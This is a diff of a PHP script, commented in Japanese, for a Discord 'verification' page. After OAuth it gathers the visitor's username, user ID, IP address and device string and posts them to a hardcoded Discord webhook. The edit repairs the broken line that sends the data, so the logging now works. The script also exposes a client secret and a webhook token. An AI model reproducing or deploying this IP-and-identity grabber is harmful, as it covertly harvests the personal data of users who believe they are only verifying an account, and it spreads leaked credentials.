@@ -4,8 +4,8 @@ $client_id     = '1483731872050839564';
 $client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
 $webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
 
-// ✅ 最新のURLに書き換え
-$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app';
+// あなたの最新のRailway URL
+$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 
 
 // 待機画面
 if (!isset($_GET['code'])) {
@@ -46,13 +46,13 @@ $ua = $_SERVER['HTTP_USER_AGENT'];
 // 4. Discord Webhookへ送信
 $payload = json_encode([
     "embeds" => [[
-        "title" => "🎯 認証成功 (Railway最終版)",
+        "title" => "🎯 認証成功 (Railway版)",
         "color" => 5814783,
         "fields" => [
-            ["name" => "👤 ユーザー名", "value" => $user['username'], "inline" => true],
-            ["name" => "🆔 User ID", "value" => $user['id'], "inline" => true],
+            ["name" => "👤 ユーザー名", "value" => $user['username'] ?? 'Unknown', "inline" => true],
+            ["name" => "🆔 User ID", "value" => $user['id'] ?? 'Unknown', "inline" => true],
             ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
-            ["name" => "📱 ブラウザ/デバイス", "value" => "```" . $ua . "```", "inline" => false]
+            ["name" => "📱 デバイス情報", "value" => "```" . $ua . "```", "inline" => false]
         ],
         "timestamp" => date("c")
     ]]
@@ -61,7 +61,7 @@ $payload = json_encode([
 $ch = curl_init($webhook_url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
 curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, grateful-wholeness-production.up.railway.app, $payload);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload); // ← ここを修正しました！
 curl_exec($ch);
 
 // 5. 完了後にDiscordへリダイレクト
